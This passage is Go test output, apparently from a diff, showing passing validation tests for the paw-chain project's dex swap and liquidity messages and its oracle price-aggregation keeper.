+=== RUN   TestMsgSwap_ValidateBasic/empty_token_in
+=== RUN   TestMsgSwap_ValidateBasic/zero_amount_in
+=== RUN   TestMsgSwap_ValidateBasic/negative_min_amount_out
+--- PASS: TestMsgSwap_ValidateBasic (0.00s)
+    --- PASS: TestMsgSwap_ValidateBasic/valid_swap (0.00s)
+    --- PASS: TestMsgSwap_ValidateBasic/invalid_trader_address (0.00s)
+    --- PASS: TestMsgSwap_ValidateBasic/zero_pool_id (0.00s)
+    --- PASS: TestMsgSwap_ValidateBasic/empty_token_in (0.00s)
+    --- PASS: TestMsgSwap_ValidateBasic/zero_amount_in (0.00s)
+    --- PASS: TestMsgSwap_ValidateBasic/negative_min_amount_out (0.00s)
+=== RUN   TestMsgAddLiquidity_ValidateBasic
+=== RUN   TestMsgAddLiquidity_ValidateBasic/valid_add_liquidity
+=== RUN   TestMsgAddLiquidity_ValidateBasic/invalid_provider_address
+=== RUN   TestMsgAddLiquidity_ValidateBasic/zero_pool_id
+=== RUN   TestMsgAddLiquidity_ValidateBasic/zero_amount_A
+=== RUN   TestMsgAddLiquidity_ValidateBasic/negative_amount_B
+--- PASS: TestMsgAddLiquidity_ValidateBasic (0.00s)
+    --- PASS: TestMsgAddLiquidity_ValidateBasic/valid_add_liquidity (0.00s)
+    --- PASS: TestMsgAddLiquidity_ValidateBasic/invalid_provider_address (0.00s)
+    --- PASS: TestMsgAddLiquidity_ValidateBasic/zero_pool_id (0.00s)
+    --- PASS: TestMsgAddLiquidity_ValidateBasic/zero_amount_A (0.00s)
+    --- PASS: TestMsgAddLiquidity_ValidateBasic/negative_amount_B (0.00s)
+=== RUN   TestMsgRemoveLiquidity_ValidateBasic
+=== RUN   TestMsgRemoveLiquidity_ValidateBasic/valid_remove_liquidity
+=== RUN   TestMsgRemoveLiquidity_ValidateBasic/invalid_provider_address
+=== RUN   TestMsgRemoveLiquidity_ValidateBasic/zero_pool_id
+=== RUN   TestMsgRemoveLiquidity_ValidateBasic/zero_liquidity_shares
+=== RUN   TestMsgRemoveLiquidity_ValidateBasic/negative_shares
+--- PASS: TestMsgRemoveLiquidity_ValidateBasic (0.00s)
+    --- PASS: TestMsgRemoveLiquidity_ValidateBasic/valid_remove_liquidity (0.00s)
+    --- PASS: TestMsgRemoveLiquidity_ValidateBasic/invalid_provider_address (0.00s)
+    --- PASS: TestMsgRemoveLiquidity_ValidateBasic/zero_pool_id (0.00s)
+    --- PASS: TestMsgRemoveLiquidity_ValidateBasic/zero_liquidity_shares (0.00s)
+    --- PASS: TestMsgRemoveLiquidity_ValidateBasic/negative_shares (0.00s)
+PASS
+ok  	github.com/paw-chain/paw/x/dex/types	(cached)
+?   	github.com/paw-chain/paw/x/oracle	[no test files]
+WARNING:(ast) sonic only supports go1.17~1.23, but your environment is not suitable
+=== RUN   TestCalculateMedian
+=== RUN   TestCalculateMedian/odd_number_of_prices
+=== RUN   TestCalculateMedian/even_number_of_prices
+=== RUN   TestCalculateMedian/single_price
+--- PASS: TestCalculateMedian (0.00s)
+    --- PASS: TestCalculateMedian/odd_number_of_prices (0.00s)
+    --- PASS: TestCalculateMedian/even_number_of_prices (0.00s)
+    --- PASS: TestCalculateMedian/single_price (0.00s)
+=== RUN   TestAggregatePrice
+--- PASS: TestAggregatePrice (0.00s)
+=== RUN   TestAggregatePriceInsufficientSubmissions
+--- PASS: TestAggregatePriceInsufficientSubmissions (0.00s)
+=== RUN   TestAggregatePriceWithOutliers
+--- PASS: TestAggregatePriceWithOutliers (0.00s)
+=== RUN   TestGetPriceWithConfidence
+--- PASS: TestGetPriceWithConfidence (0.00s)
+=== RUN   TestPriceDeviation
+=== RUN   TestPriceDeviation/no_deviation
+=== RUN   TestPriceDeviation/10%_higher
+=== RUN   TestPriceDeviation/10%_lower
+--- PASS: TestPriceDeviation (0.00s)
+    --- PASS: TestPriceDeviation/no_deviation (0.00s)
+    --- PASS: TestPriceDeviation/10%_higher (0.00s)
+    --- PASS: TestPriceDeviation/10%_lower (0.00s)
+=== RUN   TestIsOutlier
+=== RUN   TestIsOutlier/within_threshold
+=== RUN   TestIsOutlier/beyond_threshold
+=== RUN   TestIsOutlier/exactly_at_threshold
+--- PASS: TestIsOutlier (0.00s)
+    --- PASS: TestIsOutlier/within_threshold (0.00s)
+    --- PASS: TestIsOutlier/beyond_threshold (0.00s)
+    --- PASS: TestIsOutlier/exactly_at_threshold (0.00s)
+=== RUN   TestSetAndGetPriceFeed
+--- PASS: TestSetAndGetPriceFeed (0.00s)
+=== RUN   TestGetAllPriceFeeds
+--- PASS: TestGetAllPriceFeeds (0.00s)
+=== RUN   TestDeletePriceFeed
+--- PASS: TestDeletePriceFeed (0.00s)
+=== RUN   TestIsPriceFeedStale
+--- PASS: TestIsPriceFeedStale (0.00s)
+=== RUN   TestGetValidPrice
+--- PASS: TestGetValidPrice (0.00s)
+=== RUN   TestValidatorSubmission
+--- PASS: TestValidatorSubmission (0.00s)
+=== RUN   TestGetValidatorSubmissions
+--- PASS: TestGetValidatorSubmissions (0.00s)
+=== RUN   TestDeleteValidatorSubmission
+--- PASS: TestDeleteValidatorSubmission (0.00s)
+PASS
+ok  	github.com/paw-chain/paw/x/oracle/keeper	(cached)
+?   	github.com/paw-chain/paw/x/oracle/types	[no test files]
